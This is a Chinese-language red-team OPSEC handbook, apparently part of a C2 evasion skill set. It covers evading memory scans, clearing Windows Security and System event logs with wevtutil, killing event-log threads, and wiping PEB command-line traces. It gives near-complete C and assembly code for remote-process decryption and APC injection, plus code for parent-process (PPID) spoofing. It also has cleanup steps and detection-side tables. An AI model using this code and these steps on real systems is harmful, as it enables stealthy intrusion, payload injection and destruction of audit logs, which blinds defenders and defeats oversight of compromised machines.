# OPSEC 加固（OPSEC_HARDENING）

> 本文件为 `c2-custom-evasion.md` 技能文件索引的伴生手册（补齐断链），并承担 P1 的
> 异地解密、PPID 欺骗检测侧、清理规程。
> 覆盖 **内存扫描规避 → 日志抑制 → 异地解密 → 清理规程 → 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`。

## 1. 内存扫描规避

- **睡眠期加密**：Ekko/Foliage/DeathSleep（见 `ADVANCED_EVASION.md` §2）。
- **最小化明文驻留**：分段解密 + 执行后再加密。
- **复用合法内存**：Module Stomping/Phantom DLL（有磁盘背书）。

## 2. 日志抑制

### 2.1 事件日志

```powershell
# 清安全日志（需管理员，且本身是检测点）
wevtutil cl Security
wevtutil cl System
# 更隐蔽：Phant0m 终止事件日志线程（不删文件，见 ADVANCED_EVASION.md）
```

### 2.2 进程内痕迹

```c
// 清除 PEB 命令行痕迹（见 T063）
// 覆写 ProcessParameters->CommandLine，使 WMI/Sysmon 读不到真实参数
```

## 3. 异地解密（P1 #16）

**原理**：payload 在 A 进程（父/远程）解密，经共享内存/section 传给 B 进程执行，把「解密动作」与「执行动作」分离到不同进程，降低单进程内存扫描命中率。

```c
// 完整实现：异地解密——解密器+密钥只在远程进程 R 内存出现，A 进程零明文驻留
// 载荷形态：XOR 流密文 + 内联解密 stub（stub 尾部跟随布局区，rip 自定位）
//
// stub 汇编语义（x64；落地时按此语义组装机器码，或直接用下述 C 逻辑编译成
// 位置无关 stub 再抽取——教学形态给汇编语义而非裸字节，防拼错）：
//   lea  rdi, [rip+disp]      ; → 布局区起点（keylen/key/len/cipher 顺序存放）
//   mov  rcx, [rdi+0x08]      ; len
//   xor  r8,  r8              ; 密钥下标
//   xor  r9,  r9              ; 数据下标
// .loop:
//   cmp  r9, rcx
//   jae  .done
//   mov  al, [rdi+0x10+r8]    ; key[i]
//   xor  [rdi+0x18+r9], al    ; cipher[j] ^= key[i]（原地解密）
//   inc  r9
//   inc  r8
//   cmp  r8, [rdi]            ; keylen
//   jb   .loop
//   xor  r8, r8               ; 密钥回绕
//   jmp  .loop
// .done:
//   lea  rax, [rdi+0x18]      ; 解密后明文起点
//   jmp  rax                  ; 原地执行

#define STUB_SZ 0x40          /* 上述汇编的预留长度（按实际汇编结果填充） */
int remote_decrypt_exec(DWORD targetPid, DWORD targetTid,
                        const BYTE* cipher, SIZE_T cLen, const char* key) {
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    if (!hProc) return 1;

    /* 1) 远端组合块：stub + keylen + key + len + cipher（同一 RW 缓冲，无 RWX 窗口） */
    SIZE_T keylen = strlen(key);
    SIZE_T total  = STUB_SZ + sizeof(SIZE_T) + keylen + sizeof(SIZE_T) + cLen;
    LPVOID remote = VirtualAllocEx(hProc, NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return 2;
    BYTE* combo = (BYTE*)malloc(total);
    memset(combo, 0, STUB_SZ);                       /* stub 槽位：按上述汇编语义填充 */
    SIZE_T o = STUB_SZ;
    *(SIZE_T*)(combo + o) = keylen; o += sizeof(SIZE_T);
    memcpy(combo + o, key, keylen); o += keylen;
    *(SIZE_T*)(combo + o) = cLen;   o += sizeof(SIZE_T);
    memcpy(combo + o, cipher, cLen);
    SIZE_T wr = 0;
    if (!WriteProcessMemory(hProc, remote, combo, total, &wr)) { free(combo); return 3; }
    free(combo);

    /* 2) 远端转 RX 后经 APC 触发（解密与执行都在 R 内发生） */
    DWORD old;
    VirtualProtectEx(hProc, remote, total, PAGE_EXECUTE_READ, &old);
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid);
    if (!QueueUserAPC((PAPCFUNC)remote, hThread, 0)) return 4;
    /* A 进程自始不持明文：组合块中仅密文与解密器 */
    return 0;
}
```

**密钥管理**：密钥只存在于寄存器/栈（不落明文堆）；分段解密时逐段用密钥流（CTR 模式），避免整段明文。

## 4. 清理规程（Cleanup）

| 对象 | 清理动作 | 检测侧 |
|---|---|---|
| 落盘文件 | 删除 + Melt（标记删除） | 文件删除遥测 |
| 持久化 | 按登记制清单移除（计划任务/服务/启动项） | 持久化变更审计 |
| 日志 | 清事件日志 / Phant0m | 日志静默 |
| 内存 | 进程退出前擦除敏感缓冲 | 内存取证 |

## 5. PPID 欺骗（父进程欺骗，P1 #26 检测侧配对）

```c
// 攻击侧：把子进程父进程伪装成合法进程（explorer.exe/svchost.exe）
SIZE_T attrSize = 0; InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
LPPROC_THREAD_ATTRIBUTE_LIST attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(attr, 1, 0, &attrSize);
HANDLE fakeParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &fakeParent, sizeof(fakeParent), NULL, NULL);
// 用 EXTENDED_STARTUPINFO_PRESENT 传入 attr 创建子进程
```

**检测侧配对（P1 #26）**：

| 判据 | 方法 |
|---|---|
| 4688 父进程校验 | 子进程父 PID ≠ 实际创建者（ETW/Sysmon 溯源） |
| 进程树异常 | 父进程与子进程「不匹配」（如 explorer.exe 直接派生 cmd + 网络） |
| 内核遥测 | 真实父进程 ID（EPROCESS）与声明父进程不一致 |

## 6. 检测侧总表（回馈 attack-defense）

| 环节 | 检测点 | 判据 |
|---|---|---|
| 内存扫描 | 睡眠期加密区域 | 内存快照熵突变 |
| 日志抑制 | 事件日志静默 | 1102 事件缺失 + 线程终止 |
| 异地解密 | 跨进程写 + 解密 | 跨进程 RW→RX + 解密行为 |
| PPID 欺骗 | 4688 父进程 | 声明父进程 ≠ 真实父进程 |

## 7. 实测判据

| 判据 | 方法 |
|---|---|
| 内存是否干净 | 睡眠期内存扫描无明文 |
| 日志是否盲 | 目标事件缺失但无 1102（Phant0m 型） |
| PPID 是否生效 | 进程树工具（Process Explorer）看父进程是否伪装 |

*WARNING: 授权红队评估与安全研究专用。*
